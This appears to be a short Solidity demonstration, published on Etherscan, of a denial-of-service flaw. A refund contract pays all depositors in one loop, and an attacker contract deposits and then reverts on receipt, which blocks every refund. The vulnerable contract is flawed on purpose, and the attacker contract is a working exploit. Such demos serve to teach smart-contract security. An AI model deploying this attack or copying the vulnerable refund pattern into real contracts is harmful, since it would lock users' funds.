/**
 *Submitted for verification at Etherscan.io on 2022-06-07
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.4;

contract DDosDemo {
    mapping(address => uint) public user_amounts;
    mapping(address => bool) public user_is_deposited;
    address[] public all_users;
    bool public isEnd = false;

    function deposit() external payable {
        require(msg.value >0, "zero value");
        user_amounts[msg.sender] += msg.value;
        if(!user_is_deposited[msg.sender]) {
            user_is_deposited[msg.sender] = true;
            all_users.push(msg.sender);
        }
    }

    function payBack() external {
        // first check  state
        require(!isEnd," is end");
        // second change state
        isEnd = true;
        for(uint i=0;i<all_users.length;i++) {
            address payable user = payable(all_users[i]);
            uint value = user_amounts[user];
            user_amounts[user] = 0;
            // third transfer eth
            user.transfer(value);
        }
    }
}

contract DDosAttack {
    function deposit(address target) external payable {
        require(msg.value >0, "zero value");
        DDosDemo(target).deposit{value:msg.value}();
    }

    receive() external payable {
        revert("Good Bye");
    }
}